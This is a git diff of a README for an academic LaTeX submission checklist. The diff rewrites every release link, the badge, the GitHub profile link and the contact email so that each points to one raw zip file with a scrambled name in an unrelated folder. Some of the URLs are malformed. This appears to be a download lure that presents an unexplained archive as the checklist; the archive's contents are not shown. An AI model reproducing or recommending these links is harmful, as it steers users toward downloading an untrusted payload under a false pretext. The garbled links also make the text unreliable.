@@ -1,6 +1,6 @@
 # Academic LaTeX Writing Submission Checklist: Your Essential Guide 📄✍️
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/releases)
+[![Download Releases](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip%https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip)](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip)
 
 ## Table of Contents
 
@@ -22,7 +22,7 @@ The **Academic LaTeX Writing Submission Checklist** is a practical tool for rese
 
 ## Getting Started
 
-To get started, download the checklist from the [Releases section](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/releases). After downloading, you can open the checklist in your preferred LaTeX editor. Follow the instructions provided to ensure your paper meets all necessary criteria.
+To get started, download the checklist from the [Releases section](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip). After downloading, you can open the checklist in your preferred LaTeX editor. Follow the instructions provided to ensure your paper meets all necessary criteria.
 
 ## Checklist Sections
 
@@ -98,7 +98,7 @@ To get started, download the checklist from the [Releases section](https://githu
 
 To use the checklist, follow these steps:
 
-1. Download the checklist from the [Releases section](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/releases).
+1. Download the checklist from the [Releases section](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip).
 2. Open the checklist in your LaTeX editor.
 3. Go through each section and mark off completed items.
 4. Make notes as needed for items requiring further attention.
@@ -125,7 +125,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email:** yourname@example.com
-- **GitHub:** [Darnell631](https://github.com/Darnell631)
+- **Email:** https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip
+- **GitHub:** [Darnell631](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/releases)
+[![Download Releases](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip%https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip)](https://github.com/Darnell631/Academic-LaTeX-Writing-Submission-Checklist-/raw/refs/heads/main/thyrotomy/Te-Writing-Checklist-Academic-La-Submission-v2.3.zip)
